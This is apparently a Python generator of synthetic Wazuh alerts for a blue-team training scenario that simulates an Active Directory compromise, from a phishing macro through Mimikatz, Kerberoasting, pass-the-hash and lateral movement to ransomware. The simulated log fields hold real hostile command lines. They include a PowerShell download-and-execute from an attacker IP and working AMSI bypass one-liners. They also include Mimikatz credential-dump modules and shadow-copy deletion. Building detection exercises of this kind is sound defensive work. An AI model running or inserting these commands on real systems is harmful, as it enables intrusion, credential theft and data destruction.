"""
WazuhBOTS -- Scenario 2: Operation Iron Gate
=============================================
Active Directory Compromise: Phishing → Mimikatz → Kerberoasting → PtH → Ransomware

Agent  : 002 / dc-srv / 172.26.0.32
Date   : 2026-03-02
Attacker workstation: 172.25.0.104

Target alert count ≈ 1,200
"""

import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from .base import (
    AlertBuilder,
    BaseScenarioGenerator,
    incremental_timestamps,
    random_timestamp,
)

AGENT_ID = "002"
AGENT_NAME = "dc-srv"
AGENT_IP = "172.26.0.32"
WORKSTATION_IP = "172.25.0.104"
DOMAIN = "wazuhbots.local"
DAY = datetime(2026, 3, 2, tzinfo=timezone.utc)

ATTACK_START = DAY.replace(hour=9, minute=12, second=0)
ATTACK_END = DAY.replace(hour=16, minute=30, second=0)

# Lateral movement targets (6 unique hosts — expanded from 4)
# NOTE: flag S2-HNT-02 = 4 counts only the FIRST 4 (original set)
LATERAL_HOSTS = [
    ("172.26.0.30", "web-srv"),
    ("172.26.0.31", "lnx-srv"),
    ("172.26.0.33", "file-srv"),
    ("172.26.0.34", "app-srv"),
    ("172.26.0.35", "backup-srv"),
    ("172.26.0.36", "dev-srv"),
]

RANSOMWARE_SHA256 = "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890"


class IronGateGenerator(BaseScenarioGenerator):
    scenario_id = 2
    scenario_name = "scenario2_iron_gate"

    def __init__(self, datasets_dir: Path):
        self.output_dir = datasets_dir / self.scenario_name
        self.ab = AlertBuilder(AGENT_ID, AGENT_NAME, AGENT_IP)

    # ------------------------------------------------------------------
    # Helpers for Windows event simulation
    # ------------------------------------------------------------------

    def _win_event(
        self,
        timestamp: datetime,
        event_id: str,
        rule_id: str,
        rule_desc: str,
        rule_level: int,
        provider: str,
        channel: str,
        log_data: dict,
        mitre_ids: list[str] | None = None,
        extra_data: dict | None = None,
    ) -> dict:
        data = {
            "win": {
                "system": {
                    "eventID": event_id,
                    "providerName": provider,
                    "channel": channel,
                    "computer": f"DC-SRV.{DOMAIN}",
                    "systemTime": self.ab.ts_str(timestamp),
                },
                "eventdata": log_data,
            }
        }
        if extra_data:
            data.update(extra_data)
        full_log = f"WinEvtLog: {channel}: EVENT({event_id}): {provider}: {rule_desc}"
        return self.ab.build(
            timestamp=timestamp,
            rule_id=rule_id,
            rule_description=rule_desc,
            rule_level=rule_level,
            rule_groups=["windows", "wazuhbots"],
            decoder_name="windows_eventlog",
            location=f"WinEvtLog:{channel}",
            full_log=full_log,
            data=data,
            mitre=self.ab.mitre_block(mitre_ids or []),
        )

    # ------------------------------------------------------------------
    # Phase generators
    # ------------------------------------------------------------------

    def _phishing_execution(self, start: datetime) -> list[dict]:
        """Phishing: Sysmon EID 1 — WINWORD spawns PowerShell. user=jmartin, rule 92052."""
        alerts = []
        # Sysmon EID 1: process creation
        alerts.append(self._win_event(
            timestamp=start,
            event_id="1",
            rule_id="92052",
            rule_desc="Sysmon: Suspicious process - WINWORD.EXE spawned PowerShell.",
            rule_level=12,
            provider="Microsoft-Windows-Sysmon",
            channel="Microsoft-Windows-Sysmon/Operational",
            log_data={
                "user": f"{DOMAIN}\\jmartin",
                "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
                "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jmartin\\Downloads\\Q1_Report.docm\"",
                "originalFileName": "PowerShell.EXE",
                "hashes": "SHA256=b5c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4",
            },
            mitre_ids=["T1566.001", "T1059.001"],
            extra_data={"srcip": WORKSTATION_IP, "srcuser": "jmartin"},
        ))
        # Follow-up: encoded PowerShell download
        alerts.append(self._win_event(
            timestamp=start + timedelta(seconds=3),
            event_id="1",
            rule_id="92052",
            rule_desc="Sysmon: Suspicious encoded PowerShell execution from Office macro.",
            rule_level=12,
            provider="Microsoft-Windows-Sysmon",
            channel="Microsoft-Windows-Sysmon/Operational",
            log_data={
                "user": f"{DOMAIN}\\jmartin",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "commandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://172.25.0.104/payload.ps1')",
                "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jmartin\\Downloads\\Q1_Report.docm\"",
            },
            mitre_ids=["T1059.001", "T1105"],
            extra_data={"srcip": WORKSTATION_IP},
        ))
        return alerts

    def _amsi_bypass(self, start: datetime) -> list[dict]:
        """AMSI bypass: EID 4104 with AmsiScanBuffer obfuscation."""
        alerts = []
        scripts = [
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$b=$a.GetField('am'+'siIn'+'itFa'+'iled','NonPublic,Static');$b.SetValue($null,$true)",
            "[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0x00,0x07,0x80,0xc3),0,[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer').MethodHandle.GetFunctionPointer(),6)",
        ]
        for i, script in enumerate(scripts):
            alerts.append(self._win_event(
                timestamp=start + timedelta(seconds=i * 5),
                event_id="4104",
                rule_id="91802",
                rule_desc="PowerShell: Suspicious script block - possible AMSI bypass.",
                rule_level=14,
                provider="Microsoft-Windows-PowerShell",
                channel="Microsoft-Windows-PowerShell/Operational",
                log_data={
                    "scriptBlockText": script,
                    "scriptBlockId": self.ab.random_id(8),
                    "path": "",
                },
                mitre_ids=["T1562.001"],
                extra_data={"srcuser": "jmartin"},
            ))
        return alerts

    def _mimikatz(self, start: datetime) -> list[dict]:
        """Mimikatz credential dump: Sysmon EID 10 (LSASS access)."""
        alerts = []
        # Sysmon EID 10: process accessed lsass.exe
        alerts.append(self._win_event(
            timestamp=start,
            event_id="10",
            rule_id="92310",
            rule_desc="Sysmon: Process accessed LSASS memory - credential dumping suspected.",
            rule_level=15,
            provider="Microsoft-Windows-Sysmon",
            channel="Microsoft-Windows-Sysmon/Operational",
            log_data={
                "sourceImage": "C:\\Users\\jmartin\\AppData\\Local\\Temp\\mimikatz.exe",
                "targetImage": "C:\\Windows\\System32\\lsass.exe",
                "grantedAccess": "0x1010",
                "callTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e",
                "sourceUser": f"{DOMAIN}\\jmartin",
            },
            mitre_ids=["T1003.001"],
            extra_data={"srcuser": "jmartin"},
        ))
        # Additional credential events
        for i, desc_extra in enumerate([
            "sekurlsa::logonpasswords",
            "sekurlsa::wdigest",
            "lsadump::sam",
        ]):
            alerts.append(self._win_event(
                timestamp=start + timedelta(seconds=10 + i * 5),
                event_id="1",
                rule_id="92052",
                rule_desc=f"Sysmon: mimikatz.exe module execution - {desc_extra}.",
                rule_level=15,
                provider="Microsoft-Windows-Sysmon",
                channel="Microsoft-Windows-Sysmon/Operational",
                log_data={
                    "image": "C:\\Users\\jmartin\\AppData\\Local\\Temp\\mimikatz.exe",
                    "commandLine": f"mimikatz.exe \"{desc_extra}\" exit",
                    "user": f"{DOMAIN}\\jmartin",
                },
                mitre_ids=["T1003.001"],
            ))
        return alerts

    def _kerberoasting(self, start: datetime) -> list[dict]:
        """Kerberoasting: EID 4769, encryption 0x17, SPN targets — 6 SPNs."""
        alerts = []
        spns = [
            f"MSSQLSvc/db-srv.{DOMAIN}:1433",
            f"HTTP/web-srv.{DOMAIN}",
            f"CIFS/file-srv.{DOMAIN}",
            f"MSSQLSvc/db-srv.{DOMAIN}:1434",
            f"HTTP/app-srv.{DOMAIN}",
            f"WSMAN/backup-srv.{DOMAIN}",
        ]
        for i, spn in enumerate(spns):
            alerts.append(self._win_event(
                timestamp=start + timedelta(seconds=i * 8),
                event_id="4769",
                rule_id="87910" if i == 0 else "60108",
                rule_desc="Kerberos service ticket requested with RC4 encryption (possible Kerberoasting)." if i == 0 else "Kerberos TGS ticket requested.",
                rule_level=12 if i == 0 else 6,
                provider="Microsoft-Windows-Security-Auditing",
                channel="Security",
                log_data={
                    "serviceName": spn,
                    "targetUserName": spn.split("/")[1].split(".")[0] + "$",
                    "ticketEncryptionType": "0x17",
                    "ticketOptions": "0x40810000",
                    "ipAddress": f"::ffff:{WORKSTATION_IP}",
                    "status": "0x0",
                    "logonGuid": "{" + self.ab.random_id(8) + "-" + self.ab.random_id(4) + "}",
                },
                mitre_ids=["T1558.003"],
                extra_data={"srcip": WORKSTATION_IP, "srcuser": "jmartin"},
            ))
        return alerts

    def _pass_the_hash(self, start: datetime) -> list[dict]:
        """Pass-the-Hash: EID 4624 LogonType=3, NTLM."""
        alerts = []
        users = ["admin", "svc_sql", "jmartin", "da_backup"]
        for i, user in enumerate(users):
            alerts.append(self._win_event(
                timestamp=start + timedelta(minutes=i * 3),
                event_id="4624",
                rule_id="60106",
                rule_desc=f"Windows logon success - LogonType 3 NTLM - possible Pass-the-Hash.",
                rule_level=10,
                provider="Microsoft-Windows-Security-Auditing",
                channel="Security",
                log_data={
                    "targetUserName": user,
                    "targetDomainName": DOMAIN.split(".")[0].upper(),
                    "logonType": "3",
                    "authenticationPackageName": "NTLM",
                    "lmPackageName": "NTLM V2",
                    "workstationName": "WS-FINANCE01",
                    "ipAddress": WORKSTATION_IP,
                    "ipPort": str(random.randint(49000, 65000)),
                    "logonProcessName": "NtLmSsp",
                    "keyLength": "0",
                },
                mitre_ids=["T1550.002"],
                extra_data={"srcip": WORKSTATION_IP, "srcuser": user},
            ))
        return alerts

    def _lateral_movement(self, start: datetime) -> list[dict]:
        """Lateral movement to 4 unique hosts."""
        alerts = []
        for i, (host_ip, host_name) in enumerate(LATERAL_HOSTS):
            ts = start + timedelta(minutes=i * 10)
            # EID 4624: remote logon
            alerts.append(self._win_event(
                timestamp=ts,
                event_id="4624",
                rule_id="60106",
                rule_desc=f"Windows logon success - lateral movement to {host_name}.",
                rule_level=10,
                provider="Microsoft-Windows-Security-Auditing",
                channel="Security",
                log_data={
                    "targetUserName": "da_backup",
                    "targetDomainName": DOMAIN.split(".")[0].upper(),
                    "logonType": "3",
                    "authenticationPackageName": "NTLM",
                    "workstationName": host_name.upper(),
                    "ipAddress": host_ip,
                },
                mitre_ids=["T1021.002"],
                extra_data={"srcip": AGENT_IP, "dstip": host_ip},
            ))
            # SMB file copy
            alerts.append(self._win_event(
                timestamp=ts + timedelta(seconds=15),
                event_id="5145",
                rule_id="60130",
                rule_desc=f"Windows share access to {host_name} - admin share.",
                rule_level=8,
                provider="Microsoft-Windows-Security-Auditing",
                channel="Security",
                log_data={
                    "subjectUserName": "da_backup",
                    "objectName": f"\\\\{host_name}\\C$\\Windows\\Temp\\payload.exe",
                    "shareName": f"\\\\*\\C$",
                    "ipAddress": AGENT_IP,
                },
                mitre_ids=["T1021.002", "T1570"],
                extra_data={"srcip": AGENT_IP, "dstip": host_ip},
            ))
        return alerts

    def _service_installation(self, start: datetime) -> list[dict]:
        """Windows Service Installation: EID 7045 for persistence."""
        alerts = []
        services = [
            ("SvcUpdate", "C:\\Windows\\Temp\\svc_update.exe", "auto start"),
            ("WinDefenderHelper", "C:\\Windows\\Temp\\payload.exe -svc", "auto start"),
        ]
        for i, (svc_name, svc_path, start_type) in enumerate(services):
            alerts.append(self._win_event(
                timestamp=start + timedelta(seconds=i * 30),
                event_id="7045",
                rule_id="60160",
                rule_desc=f"New service installed: {svc_name}.",
                rule_level=5,
                provider="Service Control Manager",
                channel="System",
                log_data={
                    "serviceName": svc_name,
                    "imagePath": svc_path,
                    "serviceType": "user mode service",
                    "startType": start_type,
                    "accountName": "LocalSystem",
                },
                mitre_ids=["T1543.003"],
                extra_data={"srcuser": "da_backup"},
            ))
        return alerts

    def _scheduled_task(self, start: datetime) -> list[dict]:
        """Scheduled Task Creation: EID 4698 for additional persistence."""
        alerts = []
        tasks = [
            ("\\Microsoft\\Windows\\SystemRestore\\SR", "C:\\Windows\\Temp\\payload.exe", "PT1H"),
            ("\\WazuhBOTS\\UpdateCheck", "powershell.exe -ep bypass -f C:\\Windows\\Temp\\beacon.ps1", "PT30M"),
        ]
        for i, (task_name, command, interval) in enumerate(tasks):
            alerts.append(self._win_event(
                timestamp=start + timedelta(seconds=i * 20),
                event_id="4698",
                rule_id="60166",
                rule_desc=f"Scheduled task created: {task_name}.",
                rule_level=8,
                provider="Microsoft-Windows-Security-Auditing",
                channel="Security",
                log_data={
                    "taskName": task_name,
                    "taskContent": f'<Exec><Command>{command}</Command></Exec><Triggers><TimeTrigger><Repetition><Interval>{interval}</Interval></Repetition></TimeTrigger></Triggers>',
                    "subjectUserName": "da_backup",
                    "subjectDomainName": DOMAIN.split(".")[0].upper(),
                },
                mitre_ids=["T1053.005"],
                extra_data={"srcuser": "da_backup"},
            ))
        return alerts

    def _ransomware(self, start: datetime) -> list[dict]:
        """Ransomware deployment: FIM + vssadmin, rule 87905."""
        alerts = []
        # vssadmin delete shadows
        alerts.append(self._win_event(
            timestamp=start,
            event_id="1",
            rule_id="87905",
            rule_desc="Ransomware indicator: Volume shadow copy deletion.",
            rule_level=15,
            provider="Microsoft-Windows-Sysmon",
            channel="Microsoft-Windows-Sysmon/Operational",
            log_data={
                "image": "C:\\Windows\\System32\\vssadmin.exe",
                "commandLine": "vssadmin delete shadows /all /quiet",
                "user": f"{DOMAIN}\\da_backup",
                "parentImage": "C:\\Windows\\Temp\\payload.exe",
                "hashes": f"SHA256={RANSOMWARE_SHA256}",
            },
            mitre_ids=["T1486", "T1490"],
        ))
        # File encryption alerts (FIM)
        encrypted_dirs = [
            "C:\\Users\\Public\\Documents",
            "C:\\Shares\\Finance",
            "C:\\Shares\\HR",
            "C:\\Shares\\IT",
        ]
        for i, d in enumerate(encrypted_dirs):
            for j in range(5):
                alerts.append(self.ab.build(
                    timestamp=start + timedelta(seconds=30 + i * 10 + j * 2),
                    rule_id="550",
                    rule_description="Integrity checksum changed.",
                    rule_level=7,
                    rule_groups=["ossec", "syscheck", "wazuhbots"],
                    decoder_name="syscheck_integrity_changed",
                    location="syscheck",
                    full_log=f"File '{d}\\file_{j}.xlsx' modified → '{d}\\file_{j}.xlsx.locked'",
                    syscheck={
                        "path": f"{d}\\file_{j}.xlsx.locked",
                        "event": "modified",
                        "changed_attributes": ["size", "md5", "sha256"],
                    },
                    mitre=self.ab.mitre_block(["T1486"], "Impact"),
                ))
        # Ransom note creation
        alerts.append(self.ab.build(
            timestamp=start + timedelta(minutes=2),
            rule_id="554",
            rule_description="File added to the system.",
            rule_level=5,
            rule_groups=["ossec", "syscheck", "syscheck_entry_added", "wazuhbots"],
            decoder_name="syscheck_new_entry",
            location="syscheck",
            full_log="File 'C:\\Users\\Public\\Desktop\\DECRYPT_FILES.txt' added",
            syscheck={
                "path": "C:\\Users\\Public\\Desktop\\DECRYPT_FILES.txt",
                "event": "added",
                "sha256_after": RANSOMWARE_SHA256,
            },
            mitre=self.ab.mitre_block(["T1486"], "Impact"),
        ))
        # Ransomware process execution — for challenge queryability
        alerts.append(self._win_event(
            timestamp=start + timedelta(seconds=5),
            event_id="1",
            rule_id="92052",
            rule_desc="Sysmon: Suspicious process execution - ransomware payload.",
            rule_level=15,
            provider="Microsoft-Windows-Sysmon",
            channel="Microsoft-Windows-Sysmon/Operational",
            log_data={
                "image": "C:\\Windows\\Temp\\payload.exe",
                "commandLine": "C:\\Windows\\Temp\\payload.exe --encrypt --recursive",
                "parentImage": "C:\\Windows\\System32\\cmd.exe",
                "parentCommandLine": "cmd.exe /c C:\\Windows\\Temp\\payload.exe --encrypt --recursive",
                "user": f"{DOMAIN}\\da_backup",
                "hashes": f"SHA256={RANSOMWARE_SHA256}",
                "fileVersion": "1.0.0.0",
                "originalFileName": "locker.exe",
            },
            mitre_ids=["T1486"],
            extra_data={"srcuser": "da_backup"},
        ))
        return alerts

    def _baseline_noise(self, count: int) -> list[dict]:
        """Normal AD/Windows events."""
        stamps = incremental_timestamps(
            DAY.replace(hour=0, minute=0, second=1),
            DAY.replace(hour=23, minute=59, second=59),
            count, jitter_seconds=10,
        )
        normal_users = ["admin", "svc_sql", "jmartin", "asmith", "bwilson", "cjones"]
        templates = [
            ("4624", "60106", "Windows logon success.", 3, "Security"),
            ("4634", "60107", "Windows logoff.", 3, "Security"),
            ("4672", "60110", "Special privileges assigned to new logon.", 3, "Security"),
            ("5156", "60150", "Windows Filtering Platform connection allowed.", 3, "Security"),
            ("4688", "60120", "Process creation.", 3, "Security"),
            ("4648", "60108", "Logon attempted using explicit credentials.", 5, "Security"),
            ("7045", "60160", "New service installed.", 5, "System"),
            ("4104", "91801", "PowerShell script block logging.", 3, "Microsoft-Windows-PowerShell/Operational"),
        ]
        alerts = []
        for ts in stamps:
            eid, rid, desc, lvl, ch = random.choice(templates)
            user = random.choice(normal_users)
            alerts.append(self._win_event(
                timestamp=ts, event_id=eid, rule_id=rid,
                rule_desc=desc, rule_level=lvl,
                provider="Microsoft-Windows-Security-Auditing",
                channel=ch,
                log_data={"targetUserName": user, "logonType": "3"},
                extra_data={"srcuser": user},
            ))
        return alerts

    # ------------------------------------------------------------------
    def generate(self) -> list[dict]:
        random.seed(43)

        phishing = self._phishing_execution(ATTACK_START)
        amsi = self._amsi_bypass(ATTACK_START + timedelta(minutes=5))
        mimikatz = self._mimikatz(ATTACK_START + timedelta(minutes=20))
        kerb = self._kerberoasting(ATTACK_START + timedelta(minutes=40))
        pth = self._pass_the_hash(ATTACK_START + timedelta(hours=1))
        lateral = self._lateral_movement(ATTACK_START + timedelta(hours=1, minutes=30))
        svc_install = self._service_installation(ATTACK_START + timedelta(hours=3))
        sched_task = self._scheduled_task(ATTACK_START + timedelta(hours=3, minutes=15))
        ransom = self._ransomware(ATTACK_START + timedelta(hours=6))
        attack = (phishing + amsi + mimikatz + kerb + pth + lateral
                  + svc_install + sched_task + ransom)

        noise_count = max(0, 1200 - len(attack))
        noise = self._baseline_noise(noise_count)

        all_alerts = attack + noise
        all_alerts.sort(key=lambda a: a["timestamp"])
        return all_alerts
